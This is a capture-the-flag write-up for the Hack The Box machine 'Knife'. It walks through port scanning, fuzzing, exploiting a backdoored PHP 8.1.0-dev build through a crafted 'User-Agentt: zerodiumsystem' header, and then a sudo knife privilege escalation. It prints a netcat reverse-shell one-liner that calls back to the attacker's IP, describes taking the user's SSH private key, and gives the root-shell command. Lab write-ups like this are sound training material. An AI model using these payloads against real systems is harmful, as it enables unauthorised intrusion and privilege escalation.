## Hack The Box -- Knife -- (10.129.201.99)

### Enumeration

I'll start off with an nmap scan so I can see what ports are open on the box. It looks like just ports 22 and 80 are open and the webserver is running Apache 2.4.41 on an Ubuntu OS.

	PORT   STATE SERVICE REASON         VERSION
	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=
	|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=
	|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
	80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
	| http-methods: 
	|_  Supported Methods: GET HEAD POST
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	|_http-title:  Emergent Medical Idea
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
	Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
	No exact OS matches for host (test conditions non-ideal).
	TCP/IP fingerprint:
	SCAN(V=7.94SVN%E=4%D=10/6%OT=22%CT=%CU=43552%PV=Y%DS=2%DC=T%G=N%TM=67030C71%P=aarch64-unknown-linux-gnu)
	SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
	OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
	WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
	ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)
	T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
	T2(R=N)
	T3(R=N)
	T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
	IE(R=Y%DFI=N%T=40%CD=S)

	Uptime guess: 5.239 days (since Tue Oct  1 11:33:26 2024)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=262 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Viewing the website we get a page named "Emergent Medical Idea" and it doesn't look like any of the link buttons work on the home page. I'll run a gobuster scan and see if I can find any additional direcories.

![Webpage](/Knife/images/webpage.png) 


![Webpage](/Knife/images/gobuster.png) 

![Webpage](/Knife/images/feroxbuster.png) 


Directory fuzzing doesn't really return anything useful just /index.php

I'll try and see if I can find any subdomains by fuzzing with ffuf. Subdomain scanning also returned no results.

	$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://knife.htb -H "Host: FUZZ.knife.htb -fs 5815 -o subdomains.txt


![Webpage](/Knife/images/ffuf.png) 


When I tried to curl the index.php url I received the following information:

	* Host knife.htb:80 was resolved.                                                                            
	* IPv6: (none)             
	* IPv4: 10.129.201.99                                                                                        
	*   Trying 10.129.201.99:80...                        
	* Connected to knife.htb (10.129.201.99) port 80                                                             
	* using HTTP/1.x                                                                                             
	> GET /index.php HTTP/1.1                                                                                    
	> Host: knife.htb                                                                                            
	> User-Agent: curl/8.10.1                                                                                    
	> Accept: */*                                                                                                
	>                                                                                                            
	* Request completely sent off                         
	< HTTP/1.1 200 OK                                                                                            
	HTTP/1.1 200 OK                                                                                              
	< Date: Sun, 06 Oct 2024 23:53:26 GMT                                                                        
	Date: Sun, 06 Oct 2024 23:53:26 GMT                                                                          
	< Server: Apache/2.4.41 (Ubuntu)                                                                             
	Server: Apache/2.4.41 (Ubuntu)                                                                               
	< X-Powered-By: PHP/8.1.0-dev                                                                                
	X-Powered-By: PHP/8.1.0-dev
	< Vary: Accept-Encoding                               
	Vary: Accept-Encoding                                                                                        
	< Transfer-Encoding: chunked                                                                                 
	Transfer-Encoding: chunked                                                                                   
	< Content-Type: text/html; charset=UTF-8                                                                     
	Content-Type: text/html; charset=UTF-8


After running curl I notice that this is running a dev version of PHP 8.1.0-dev this version could have so vulnerabilities associated with it since it's a development version. Googling that version of PHP I find the following [exploit](https://www.exploit-db.com/exploits/49933).


Looking at the content of the exploit it looks like the User-Agent header is vulnerable. If we add an extra t and zerodiumsystem we can execute commands.

![Webpage](/Knife/images/exploit.png) 

Example:

User-Agentt: zerodiumsystem('id')

I'll send a Get request for / to burp and update the User-Agent strind and see if I can manually trigger the exploit.

### Foothold

![Foothold](/Knife/images/id.png) 


Updating the User-Agent in burp works and when I run the id command I get a user of james.

	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.240 443 >/tmp/f

I'll try updating the user agent string with a reverse shell and see if that works. Set a listener on my host for 443.

![Webpage](/Knife/images/shell.png) 

Sending the request in burp returns me with a shell running as the james user.

![Webpage](/Knife/images/shell2.png) 

It appears james is the only user on this host and I can grab the user.txt flag from his home directory.


![Webpage](/Knife/images/user.png) 


If I cd into James' /home/james/.ssh directory and start a python sever I can wget James' private key to my attack box so now I should be able to ssh into knife using James' ssh key.

![Webpage](/Knife/images/ssh.png) 


![Webpage](/Knife/images/ssh2.png) 


### Privilege Escalation


Running sudo -l on the host shows that james can run the following commands on knife:
	(root) NOPASSWD: /usr/bin/knife
	
![Webpage](/Knife/images/sudo.png) 


If we check gtfobins they do have a privilege escalation for the [knife binary](https://gtfobins.github.io/gtfobins/knife/) it walks throught it simply all we have to run is the folloiwng:

	sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
	

![Webpage](/Knife/images/knife.png) 

And after running the command we are returned a root shell on knife and can grab the root flag. This was a fun and pretty easy box.

![Webpage](/Knife/images/root.png) 
